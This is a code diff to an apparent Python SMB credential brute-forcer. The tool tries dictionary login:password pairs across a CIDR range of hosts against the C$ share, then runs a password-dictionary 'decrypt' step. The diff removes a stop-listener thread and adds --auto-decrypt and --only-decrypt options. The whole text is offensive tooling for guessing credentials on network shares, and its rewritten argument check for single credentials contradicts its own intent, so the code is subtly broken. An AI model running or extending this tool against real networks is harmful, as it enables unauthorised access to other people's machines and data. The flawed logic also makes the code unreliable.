@@ -7,7 +7,6 @@
 import os
 import argparse
 from tqdm import tqdm
-import threading
 from itertools import product
 from passlib.hash import lmhash, nthash
 from smb.SMBConnection import SMBConnection
@@ -71,12 +70,6 @@ def parse_dict(path, flag):
     return creds
 
 
-def stop_scan():
-    while True:
-        if input('').lower == 'stop':
-            break
-
-
 def _decrypt(use_decrypt):
     if use_decrypt is not None:
         Decrypor = Decrypt(data_folder, use_decrypt)
@@ -93,9 +86,6 @@ def main(share, domain, timeout, creds, target, use_decrypt, attempt=0):
     while start <= stop:
         try:
             for pare in tqdm(creds, desc=f"Attempting({start})"):
-                if not end_scan.is_alive():
-                    _decrypt(use_decrypt)
-                    return
                 temp_pare = list(pare)
                 conn = SMBConnection(temp_pare[0], temp_pare[1], client_machine_name, server_name, domain=domain,
                                      use_ntlm_v2=True,
@@ -147,23 +137,24 @@ if '__main__' == __name__:
     args.add_argument('-u', action='store', type=str, help='SMB login')
     args.add_argument('-p', action='store', type=str, help='SMB password')
     args.add_argument('-domain', action='store', type=str, help='SMB domain', default='WORKGROUP')
-    args.add_argument('-target', action='store', type=str, help="Host's IP with CIDR (192.168.0.1/24)", required=True)
+    args.add_argument('-target', action='store', type=str, help="Host's IP with CIDR (192.168.0.1/24)")
     args.add_argument('-timeout', type=float, help='SMB connection delay in second', default=1)
     args.add_argument('--use-dict', action='store', type=str, help='Path to login:passwords dictionary combinations')
     args.add_argument('-share', action='store', type=str, help='Share name', default='C$')
-    args.add_argument('-decrypt', action='store', type=str, help='Path to passwords dictionary')
+    args.add_argument('--auto-decrypt', action='store', type=str, help='Path to passwords dictionary')
+    args.add_argument('--only-decrypt', action='store', type=str, help='Use only decrypt function from existed data (Need a dictionary with passwords)')
     opt = args.parse_args()
 
-    if opt.decrypt is None:
+    if opt.auto_decrypt is None:
         passwords = None
     else:
-        passwords = parse_dict(opt.decrypt, True)
-    end_scan = threading.Thread(target=stop_scan,)
-    end_scan.start()
+        passwords = parse_dict(opt.auto_decrypt, True)
 
-    if opt.u and opt.p is not None and opt.use_dict is None:
+    if opt.u and opt.p and opt.target is not None and (opt.use_dict and opt.only_decrypt is None):
         main(opt.share, opt.domain, opt.timeout, [(opt.u, opt.p)], opt.target, passwords)
-    elif opt.use_dict is not None:
+    elif opt.use_dict and opt.target is not None and opt.only_decrypt is None:
         main(opt.share, opt.domain, opt.timeout, parse_dict(opt.use_dict, False), opt.target, passwords)
+    elif opt.only_decrypt is not None:
+        _decrypt(parse_dict(opt.only_decrypt, True))
     else:
-        print('login/password not specified')
+        print('login/password/target not specified')
